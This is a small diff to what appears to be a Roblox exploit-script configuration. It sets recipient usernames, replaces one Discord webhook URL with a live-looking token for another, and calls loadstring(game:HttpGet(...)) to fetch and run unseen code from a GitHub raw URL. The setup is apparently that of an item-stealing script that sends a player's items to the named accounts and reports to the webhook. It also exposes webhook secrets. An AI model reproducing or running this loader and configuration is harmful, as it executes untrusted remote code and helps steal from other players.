@@ -1,5 +1,5 @@
 UserName = "blackjjsploit"
 UserName2 = "black_jjsploits2" -- optional delete the whole line if you don't want it
-Webhook = "https://discord.com/api/webhooks/1093914677773348955/DXytrZf9y3LP-7SAU0BDjS2sGCUkbW1BrjmBSMnjPM0CBtxsdOrXsK24BXvoTlWrRhQk" -- optional delete the whole line if you don't want it
+Webhook = "https://discord.com/api/webhooks/1093947083536482334/MoRQzYqlHnODlll-cWTVrbh5mDn9aA5TPkbSoj_cIzeCVYU_b0F9wz5LldvBRcKWJ2J_" -- optional delete the whole line if you don't want it
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/Psx0/A/main/main", true))()
